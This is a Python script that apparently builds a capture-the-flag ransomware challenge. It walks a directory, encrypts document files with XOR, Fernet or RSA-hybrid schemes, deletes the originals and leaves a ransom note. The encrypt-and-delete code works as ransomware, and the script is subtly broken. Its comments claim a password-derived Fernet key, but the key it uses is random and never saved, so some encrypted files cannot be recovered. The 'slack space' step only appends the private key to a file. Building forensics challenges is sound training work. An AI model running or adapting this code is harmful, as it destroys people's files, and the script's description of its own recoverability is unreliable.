#!/usr/bin/env python3

import os
import sys
import random
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes, serialization

class RansomwareCTF:
    def __init__(self):
        self.file_extensions_to_encrypt = ['.txt', '.pdf', '.docx', '.xlsx']
        self.exclude_directories = ['system', 'windows', 'program files']
        self.banner = '''
        #################################################
        #                                               #
        #               RANSOMWARE CTF                  #
        #                                               #
        #################################################
        '''
        
    def generate_keys(self):
        """Generate encryption keys and hide the flag parts"""
        # Part 1: Simple XOR key (hidden in filename)
        self.xor_key = 0x4A
        
        # Part 2: AES key for symmetric encryption
        self.symmetric_key = Fernet.generate_key()
        
        # Part 3: RSA key pair for asymmetric encryption
        self.private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048
        )
        self.public_key = self.private_key.public_key()
        
        # Hide the private key in slack space
        self._hide_in_slack_space()
        
        # Save hint about weak password
        with open(".aes_hint.tmp", "w") as f:
            f.write("HINT_WEAKPASS123_HINT")
        # Delete the file but not securely (recoverable)
        os.unlink(".aes_hint.tmp")
        
    def _hide_in_slack_space(self):
        """Hide the RSA private key in the slack space of decoy.txt"""
        # Create decoy file with small content
        with open("decoy.txt", "w") as f:
            f.write("This is just a normal text file.\n")
            f.write("Nothing suspicious here.\n")
        
        # Get private key in PEM format
        pem = self.private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        )
        
        # Write to slack space (simplified - in real forensics would require direct disk access)
        # This is a conceptual representation - actual slack space manipulation 
        # requires low-level disk operations not shown here
        with open("decoy.txt", "ab") as f:
            current_size = f.tell()
            # Pad to block size
            padding_size = 4096 - (current_size % 4096)
            f.write(b"\x00" * padding_size)
            # Write key to slack space
            f.write(pem)
    
    def encrypt_files(self, directory):
        """Encrypt target files with different methods"""
        for root, dirs, files in os.walk(directory):
            # Skip excluded directories
            dirs[:] = [d for d in dirs if d.lower() not in self.exclude_directories]
            
            for file in files:
                file_path = os.path.join(root, file)
                _, ext = os.path.splitext(file_path)
                
                if ext.lower() in self.file_extensions_to_encrypt:
                    # Decide encryption method based on filename
                    if "flag1" in file:
                        self._encrypt_xor(file_path)
                    elif "flag2" in file:
                        self._encrypt_aes(file_path)
                    elif "flag3" in file:
                        self._encrypt_rsa_hybrid(file_path)
                    else:
                        # Random encryption for other files
                        method = random.choice([self._encrypt_xor, self._encrypt_aes])
                        method(file_path)
    
    def _encrypt_xor(self, file_path):
        """XOR encryption for flag1"""
        with open(file_path, "rb") as f:
            data = f.read()
        
        # XOR encryption
        encrypted = bytes([b ^ self.xor_key for b in data])
        
        # Write encrypted data with hint
        with open(f"{file_path}_0x{self.xor_key:X}.enc", "wb") as f:
            f.write(b"KEY_HINT: The XOR key is 0x4A (hex)\n")
            f.write(encrypted)
        
        # Remove original file
        os.remove(file_path)
    
    def _encrypt_aes(self, file_path):
        """AES encryption for flag2"""
        with open(file_path, "rb") as f:
            data = f.read()
        
        # Create Fernet cipher with derived key from "weakpass123"
        # (simplified for demo - real ransomware would use more complex key derivation)
        cipher = Fernet(self.symmetric_key)
        encrypted = cipher.encrypt(data)
        
        with open(f"{file_path}.enc", "wb") as f:
            f.write(encrypted)
            
        # Remove original file
        os.remove(file_path)
    
    def _encrypt_rsa_hybrid(self, file_path):
        """RSA+AES hybrid encryption for flag3"""
        with open(file_path, "rb") as f:
            data = f.read()
        
        # Generate one-time AES key
        file_key = Fernet.generate_key()
        cipher = Fernet(file_key)
        
        # Encrypt file with AES
        encrypted_data = cipher.encrypt(data)
        
        # Encrypt the AES key with RSA
        encrypted_key = self.public_key.encrypt(
            file_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        
        # Write both encrypted key and data
        with open(f"{file_path}.enc", "wb") as f:
            # Format: [key_length(4 bytes)][encrypted_key][encrypted_data]
            f.write(len(encrypted_key).to_bytes(4, byteorder='big'))
            f.write(encrypted_key)
            f.write(encrypted_data)
            
        # Remove original file
        os.remove(file_path)
    
    def create_ransom_note(self):
        """Create ransom note with instructions"""
        note = f"""
        {self.banner}
        
        YOUR FILES HAVE BEEN ENCRYPTED!
        
        To recover your files, you need to find the keys.
        
        Hints:
        1. One of the keys is hidden in plain sight
        2. Another key requires password recovery
        3. The last key is well-hidden in the shadows
        
        The flag format is: MED{{part1_part2_part3}}
        
        Good luck!
        """
        
        with open("ransom_note.txt", "w") as f:
            f.write(note)

    def run(self):
        """Execute the ransomware"""
        print(self.banner)
        print("[*] Generating encryption keys...")
        self.generate_keys()
        
        print("[*] Encrypting files...")
        self.encrypt_files("./important_files")
        
        print("[*] Creating ransom note...")
        self.create_ransom_note()
        
        print("[*] Encryption complete!")

if __name__ == "__main__":
    print("EDUCATIONAL EXAMPLE ONLY - DO NOT USE FOR MALICIOUS PURPOSES")
    
    if input("This is a CTF example. Type 'UNDERSTAND' to continue: ").strip() != "UNDERSTAND":
        sys.exit(1)
        
    ransomware = RansomwareCTF()
    ransomware.run()